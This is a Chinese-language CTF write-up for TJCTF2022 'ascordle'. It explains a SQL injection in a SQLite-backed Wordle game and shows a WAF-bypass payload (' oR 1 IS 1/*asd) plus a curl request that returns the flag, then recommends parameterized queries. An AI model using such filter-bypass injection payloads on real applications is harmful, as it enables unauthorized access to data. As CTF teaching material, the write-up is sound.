# TJCTF2022 ascordle

## 题目简述

这是一个每次猜测前都会随机重置 16 字符答案的 ASCII Wordle。后端把用户输入直接拼进 SQLite 查询：`SELECT * FROM answer WHERE word = '${word}'`。WAF 只按大小写敏感的子串禁止 `OR`、`or`、`--`、`=`、`>`、`<`，仍可用混合大小写与等价运算符构造恒真条件。

## 解题过程

用 `oR` 绕过对 `OR` 和 `or` 的两项检查，用 SQLite 的 `IS` 代替等号，再用未被禁止的块注释吞掉模板末尾的单引号。提交内容为：

```text
' oR 1 IS 1/*asd
```

拼接后的核心 SQL 形如：

```sql
SELECT * FROM answer WHERE word = '' oR 1 IS 1/*asd'
```

`1 IS 1` 恒真，查询总能取到刚随机生成的答案行，服务于是进入成功分支并在 JSON 的 `flag` 字段返回：

```bash
curl -s 'http://target/guess' \
  -H 'content-type: application/json' \
  -d '{"word":"'\'' oR 1 IS 1/*asd"}'
```

结果为 `tjctf{i_h3ck1n_l0v3_a5c11_w0rdl3}`。

## 方法总结

黑名单无法枚举 SQL 的大小写、注释和等价语法。这里甚至不需要恢复随机答案，只要让“是否存在匹配行”的布尔判断恒真即可。修复应使用占位符参数化 `word`，而不是继续补充关键字；随机化秘密也不能弥补查询结构本身可被控制的问题。
